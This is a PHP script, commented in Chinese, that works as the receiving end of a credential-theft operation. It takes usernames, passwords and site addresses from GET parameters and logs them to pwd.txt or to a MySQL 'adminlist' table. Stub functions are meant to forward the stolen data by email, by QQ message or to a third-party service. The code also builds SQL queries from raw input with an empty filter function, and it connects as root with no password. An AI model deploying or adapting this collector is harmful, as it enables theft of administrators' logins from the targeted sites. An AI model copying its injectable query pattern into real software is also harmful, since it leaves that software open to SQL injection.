<?php

$saveWay = 'mysql';	//存储方式,mysql:存储数据库中，file:存储文件中,mail,通过邮件发送,qq:通过webQQ协议实现QQ发送消息

/**
 * 安全过滤
 * 根据你自己的需求自行添加
 * 建议添加上去，防止被注入
 */
function filterSecInfo(){
	
}

/**
 * 保存为文本形式
 */
function saveToText(){
	$pwd = 'pwd.txt';
	$content = @file_get_contents($pwd)."\n Uname:".$_GET['uname'].'#Pwd:'.$_GET['pwd'].'#site:'.$_GET['rsite'];
	file_put_contents($pwd, $content);
}

/**
 * 保存到数据库
 */
function saveToDBserver(){
	
	filterSecInfo();	//过滤安全隐患
	
	//插入数据库中的值
	$name 	= @$_GET['uname'];	
	$pword 	= @$_GET['pwd'];
	$site	= @$_GET['rsite'];
	
	empty($name) || empty($pword) ? exit('Not Insert') : '';	//如果密码或者用户名为空就不用存储了
	$site = empty($site) ? 'No site info' : $site;
		
	//数据库配置

	$dbHost = 'localhost';	//数据库主机地址，默认本地数据库localhost
	$dbName = 'pwd';		//数据库名
	$uname  = 'root';		//数据库用户名
	$pwd	= '';			//数据库密码
	
	$con = @mysql_connect($dbHost,$uname,$pwd) or die('无法连接数据库，请确认数据库信息可用！');
	mysql_select_db($dbName) or die('没找到此数据库，请创建！');
	
	$sql = "SELECT * FROM `adminlist` WHERE `name` = '$name' AND `password` = '$pword' AND site = '$site'";
	$result = @mysql_query($sql,$con);
	$num_rows = @mysql_num_rows($result);
	
	if(empty($num_rows)){		//过滤重复数据，插入库中没有的数据
		$sql = "INSERT INTO adminlist(adminlist.`name`,adminlist.`password`,adminlist.`site`) VALUES ('$name','$pword','$site')";
		$result = @mysql_query($sql,$con);
		$num_rows = @mysql_num_rows($result);
		echo $num_rows;
	}else{
		echo '库中已有！';
	}
	@mysql_free_result($result);
}
/**
 * 保存到邮箱中，也就是发送数据到指定邮箱
 */
function saveToEmail(){
	
}
/**
 * 邮件通知
 */
function mailTipMessage(){
	
}
/**
 * QQ消息提醒
 * 通过wap协议QQ发送消息
 */
function qqTipMessage(){
	
}
/**
 * 第三方存储接口
 */
function otherApi(){
	
}
 
/**
 * 存储数据
 */
function saveData(){
	
}